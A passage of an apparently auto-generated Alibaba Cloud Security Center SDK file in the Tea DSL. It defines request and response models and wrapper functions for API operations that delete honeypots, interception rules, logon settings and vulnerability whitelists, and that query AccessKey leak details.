}

model DeleteCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCycleTaskResponseBody(name='body'),
}

async function deleteCycleTaskWithOptions(request: DeleteCycleTaskRequest, runtime: Util.RuntimeOptions): DeleteCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteCycleTask(request: DeleteCycleTaskRequest): DeleteCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCycleTaskWithOptions(request, runtime);
}

model DeleteGroupRequest {
  groupId?: long(name='GroupId', description='WB01014029', example='9454789'),
  sourceIp?: string(name='SourceIp', description='DeleteGroup', example='192.172.XX.XX'),
}

model DeleteGroupResponseBody = {
  code?: string(name='Code', example='200'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteGroupResponseBody(name='body'),
}

/**
  * 200
  *
  * @param request DeleteGroupRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DeleteGroupResponse
 */
async function deleteGroupWithOptions(request: DeleteGroupRequest, runtime: Util.RuntimeOptions): DeleteGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * 200
  *
  * @param request DeleteGroupRequest
  * @return DeleteGroupResponse
 */
async function deleteGroup(request: DeleteGroupRequest): DeleteGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteGroupWithOptions(request, runtime);
}

model DeleteHoneypotRequest {
  honeypotId?: string(name='HoneypotId', example='558b5fa40948ebe2171a74757c54dc7e58f761870fa7ee6a105e70947ec82aa9'),
  lang?: string(name='Lang', example='zh'),
}

model DeleteHoneypotResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='E14721CB-B32F-56F2-8490-CDA18E4F9268'),
  success?: boolean(name='Success', example='true'),
}

model DeleteHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotResponseBody(name='body'),
}

async function deleteHoneypotWithOptions(request: DeleteHoneypotRequest, runtime: Util.RuntimeOptions): DeleteHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypot(request: DeleteHoneypotRequest): DeleteHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotWithOptions(request, runtime);
}

model DeleteHoneypotNodeRequest {
  lang?: string(name='Lang', example='zh'),
  nodeId?: string(name='NodeId', description='Deletes a specified management node.', example='670baeee-86c4-46b9-8200-a2c38141a453'),
}

model DeleteHoneypotNodeResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='49FDE92F-A0B8-56CC-B7A8-23B17646CCAD'),
  success?: boolean(name='Success', example='true'),
}

model DeleteHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotNodeResponseBody(name='body'),
}

async function deleteHoneypotNodeWithOptions(request: DeleteHoneypotNodeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotNode(request: DeleteHoneypotNodeRequest): DeleteHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotNodeWithOptions(request, runtime);
}

model DeleteHoneypotPresetRequest {
  honeypotPresetId?: string(name='HoneypotPresetId', example='84104b7b-a2bc-41df-a190-12298f99xxxx'),
  lang?: string(name='Lang', description='设置请求和接收消息的语言类型，默认为**zh**。取值：
- **zh**：中文
- **en**：英文', example='zh'),
}

model DeleteHoneypotPresetResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
  success?: boolean(name='Success', example='true'),
}

model DeleteHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotPresetResponseBody(name='body'),
}

async function deleteHoneypotPresetWithOptions(request: DeleteHoneypotPresetRequest, runtime: Util.RuntimeOptions): DeleteHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotPresetId)) {
    query['HoneypotPresetId'] = request.honeypotPresetId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotPreset(request: DeleteHoneypotPresetRequest): DeleteHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotPresetWithOptions(request, runtime);
}

model DeleteHoneypotProbeRequest {
  lang?: string(name='Lang', description='设置请求和接收消息的语言类型，默认为**zh**。取值：

- **zh**：中文
- **en**：英文', example='zh'),
  probeId?: string(name='ProbeId', example='95f0f79c-f7e9-4b09-a6e3-95a4cb6d****'),
}

model DeleteHoneypotProbeResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='7FD1C1DC-AA67-510A-A022-5D23310C3658'),
  success?: boolean(name='Success', example='true'),
}

model DeleteHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteHoneypotProbeResponseBody(name='body'),
}

async function deleteHoneypotProbeWithOptions(request: DeleteHoneypotProbeRequest, runtime: Util.RuntimeOptions): DeleteHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteHoneypotProbe(request: DeleteHoneypotProbeRequest): DeleteHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteHoneypotProbeWithOptions(request, runtime);
}

model DeleteInstallCodeRequest {
  captchaCode?: string(name='CaptchaCode', example='1q****'),
}

model DeleteInstallCodeResponseBody = {
  requestId?: string(name='RequestId', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
}

model DeleteInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInstallCodeResponseBody(name='body'),
}

async function deleteInstallCodeWithOptions(request: DeleteInstallCodeRequest, runtime: Util.RuntimeOptions): DeleteInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.captchaCode)) {
    query['CaptchaCode'] = request.captchaCode;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInstallCode(request: DeleteInstallCodeRequest): DeleteInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInstallCodeWithOptions(request, runtime);
}

model DeleteInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', example='cdf629147cc3747d292a3f587xxxxxxxx'),
  ruleIds?: [ long ](name='RuleIds'),
}

model DeleteInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', example='D65AADFC-1D20-5A6A-8F6A-9FA53CXXXXX'),
}

model DeleteInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInterceptionRuleResponseBody(name='body'),
}

async function deleteInterceptionRuleWithOptions(request: DeleteInterceptionRuleRequest, runtime: Util.RuntimeOptions): DeleteInterceptionRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInterceptionRule(request: DeleteInterceptionRuleRequest): DeleteInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionRuleWithOptions(request, runtime);
}

model DeleteInterceptionTargetRequest {
  targetIds?: string(name='TargetIds', example='1,11,111'),
}

model DeleteInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
  result?: boolean(name='Result', example='true'),
}

model DeleteInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInterceptionTargetResponseBody(name='body'),
}

async function deleteInterceptionTargetWithOptions(request: DeleteInterceptionTargetRequest, runtime: Util.RuntimeOptions): DeleteInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetIds)) {
    query['TargetIds'] = request.targetIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInterceptionTarget(request: DeleteInterceptionTargetRequest): DeleteInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionTargetWithOptions(request, runtime);
}

model DeleteLoginBaseConfigRequest {
  config?: string(name='Config', description='The content of the logon security settings to delete. The content varies based on the type of the logon security settings. Valid values:

*   **login\\_common_ip**: approved logon IP addresses

Example: {"ip":"10.23.23.23"}.

*   **login\\_common_time**: approved logon time ranges

Example: {"startTime":"06:00:00","endTime":"16:00:00"}.

*   **login\\_common_account**: approved logon accounts

Example: {"account":"test_account\\_001"}.

*   **login\\_common_location**: approved logon locations

Example: {"location":"Shanghai"}.', example='{"startTime":"06:00:00","endTime":"16:00:00"}'),
  target?: string(name='Target', description='The UUID of the server whose logon security settings you want to delete.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  type?: string(name='Type', description='The type of the logon security settings to delete. Valid values:

*   **login\\_common_ip**: approved logon IP addresses
*   **login\\_common_time**: approved logon time ranges
*   **login\\_common_account**: approved logon accounts
*   **login\\_common_location**: approved logon locations', example='login_common_time'),
}

model DeleteLoginBaseConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteLoginBaseConfigResponseBody(name='body'),
}

async function deleteLoginBaseConfigWithOptions(request: DeleteLoginBaseConfigRequest, runtime: Util.RuntimeOptions): DeleteLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteLoginBaseConfig(request: DeleteLoginBaseConfigRequest): DeleteLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteLoginBaseConfigWithOptions(request, runtime);
}

model DeletePrivateRegistryRequest {
  registryId?: long(name='RegistryId', example='22233'),
}

model DeletePrivateRegistryResponseBody = {
  data?: boolean(name='Data', example='true'),
  requestId?: string(name='RequestId', example='818E3B38-F018-50FF-9A85-5A521747****'),
}

model DeletePrivateRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeletePrivateRegistryResponseBody(name='body'),
}

async function deletePrivateRegistryWithOptions(request: DeletePrivateRegistryRequest, runtime: Util.RuntimeOptions): DeletePrivateRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryId)) {
    query['RegistryId'] = request.registryId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeletePrivateRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deletePrivateRegistry(request: DeletePrivateRegistryRequest): DeletePrivateRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return deletePrivateRegistryWithOptions(request, runtime);
}

model DeleteSecurityEventMarkMissListRequest {
  ids?: [ long ](name='Ids', description='The IDs of custom defense rule.'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteSecurityEventMarkMissListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='23AD0BD2-8771-5647-819E-6BA51E2XXXXX'),
}

model DeleteSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSecurityEventMarkMissListResponseBody(name='body'),
}

async function deleteSecurityEventMarkMissListWithOptions(request: DeleteSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): DeleteSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteSecurityEventMarkMissList(request: DeleteSecurityEventMarkMissListRequest): DeleteSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSecurityEventMarkMissListWithOptions(request, runtime);
}

model DeleteStrategyRequest {
  id?: string(name='Id', example='1404656'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', description='Deletes a baseline check policy.', example='192.0.XX.XX'),
}

model DeleteStrategyResponseBody = {
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DeleteStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteStrategyResponseBody(name='body'),
}

async function deleteStrategyWithOptions(request: DeleteStrategyRequest, runtime: Util.RuntimeOptions): DeleteStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteStrategy(request: DeleteStrategyRequest): DeleteStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteStrategyWithOptions(request, runtime);
}

model DeleteSuspEventNodeRequest {
  noteId?: long(name='NoteId', example='123'),
}

model DeleteSuspEventNodeResponseBody = {
  code?: string(name='Code', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A57C711B-AA15-55B2-8F61-4D09CEXXXXX'),
  success?: boolean(name='Success', example='true'),
}

model DeleteSuspEventNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSuspEventNodeResponseBody(name='body'),
}

async function deleteSuspEventNodeWithOptions(request: DeleteSuspEventNodeRequest, runtime: Util.RuntimeOptions): DeleteSuspEventNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.noteId)) {
    query['NoteId'] = request.noteId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSuspEventNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteSuspEventNode(request: DeleteSuspEventNodeRequest): DeleteSuspEventNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSuspEventNodeWithOptions(request, runtime);
}

model DeleteTagWithUuidRequest {
  tagName?: string(name='TagName', example='abc'),
  uuidList?: string(name='UuidList', example='111-xx,aa-bb'),
}

model DeleteTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteTagWithUuidResponseBody(name='body'),
}

/**
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request DeleteTagWithUuidRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DeleteTagWithUuidResponse
 */
async function deleteTagWithUuidWithOptions(request: DeleteTagWithUuidRequest, runtime: Util.RuntimeOptions): DeleteTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request DeleteTagWithUuidRequest
  * @return DeleteTagWithUuidResponse
 */
async function deleteTagWithUuid(request: DeleteTagWithUuidRequest): DeleteTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteTagWithUuidWithOptions(request, runtime);
}

model DeleteUniBackupPolicyRequest {
  policyId?: long(name='PolicyId', example='123'),
  policyIds?: string(name='PolicyIds', example='123,124'),
}

model DeleteUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='4F07F4F1-88ED-5569-B519-FFCC9B7E****'),
}

model DeleteUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteUniBackupPolicyResponseBody(name='body'),
}

async function deleteUniBackupPolicyWithOptions(request: DeleteUniBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteUniBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyIds)) {
    query['PolicyIds'] = request.policyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteUniBackupPolicy(request: DeleteUniBackupPolicyRequest): DeleteUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteUniBackupPolicyWithOptions(request, runtime);
}

model DeleteVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', example='vpc-d7o009q63fqy21r8u****'),
}

model DeleteVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
}

model DeleteVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVpcHoneyPotResponseBody(name='body'),
}

async function deleteVpcHoneyPotWithOptions(request: DeleteVpcHoneyPotRequest, runtime: Util.RuntimeOptions): DeleteVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteVpcHoneyPot(request: DeleteVpcHoneyPotRequest): DeleteVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVpcHoneyPotWithOptions(request, runtime);
}

model DeleteVulWhitelistRequest {
  id?: string(name='Id', example='131231'),
  whitelist?: string(name='Whitelist', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
}

model DeleteVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DeleteVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVulWhitelistResponseBody(name='body'),
}

async function deleteVulWhitelistWithOptions(request: DeleteVulWhitelistRequest, runtime: Util.RuntimeOptions): DeleteVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteVulWhitelist(request: DeleteVulWhitelistRequest): DeleteVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVulWhitelistWithOptions(request, runtime);
}

model DescribeAccessKeyLeakDetailRequest {
  id?: long(name='Id', example='389357'),
}

model DescribeAccessKeyLeakDetailResponseBody = {
  accesskeyId?: string(name='AccesskeyId', example='LTAI4G4VjkC9wenfEvgX****'),
  asset?: string(name='Asset'),
  code?: string(name='Code', example='\\n1231 \\nak=LTAI4G4VjkC9wenfEvgX**** \\n12311123 \\nsk1999 \\nsk1999sk1999 \\nsk1999sk1999 \\n\\n\\ntest001 ak hht \\nak=LTAI4G4VjkC9wenfEvgX**** \\nsk=AjEhS9XmnIzllpAx2LxMTMdrTG****'),
  dealTime?: string(name='DealTime', example='2022-01-17 15:47:08'),
  dealType?: string(name='DealType', example='add-whitelist'),
  githubFileName?: string(name='GithubFileName', example='testAkLeak'),
  githubFileType?: string(name='GithubFileType', example='Python'),
  githubFileUpdateTime?: string(name='GithubFileUpdateTime', example='2021-07-06T09:49:33'),
  githubFileUrl?: string(name='GithubFileUrl', example='https://github.com/Blue00Blue/ExamOnline/blob/6c932c10fc3f217783f3937e2b230f79656c18a7/testAk****'),
  githubRepoName?: string(name='GithubRepoName', example='ExamOnline'),
  githubRepoUrl?: string(name='GithubRepoUrl', example='https://github.com/Blue00Blue/ExamOn****'),
  githubUser?: string(name='GithubUser', example='Blue00Blue'),
  githubUserPicUrl?: string(name='GithubUserPicUrl', example='https://avatars.githubusercontent.com/u/26296896?s=48&v=****'),
  gmtCreate?: string(name='GmtCreate', example='2021-07-06 17:49:41'),
  gmtModified?: string(name='GmtModified', example='2021-07-06 17:49:39'),
  remark?: string(name='Remark', example='12'),
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  source?: string(name='Source', example='GitHub'),
  type?: string(name='Type', example='AccessKey'),
  whitelistStatus?: string(name='WhitelistStatus', example='no'),
}

model DescribeAccessKeyLeakDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccessKeyLeakDetailResponseBody(name='body'),
}

async function describeAccessKeyLeakDetailWithOptions(request: DescribeAccessKeyLeakDetailRequest, runtime: Util.RuntimeOptions): DescribeAccessKeyLeakDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccessKeyLeakDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAccessKeyLeakDetail(request: DescribeAccessKeyLeakDetailRequest): DescribeAccessKeyLeakDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccessKeyLeakDetailWithOptions(request, runtime);
}

model DescribeAccesskeyLeakListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.\\
Maximum value: 100. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  query?: string(name='Query', description='The AccessKey ID that you want to query. Only exact match is supported.', example='LTAI4Fytv7ALKzkNVBV6****'),
  startTs?: long(name='StartTs', description='The beginning of the time range to query. You can query all AccessKey pair leaks that are detected later than this time point. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1614155361489'),
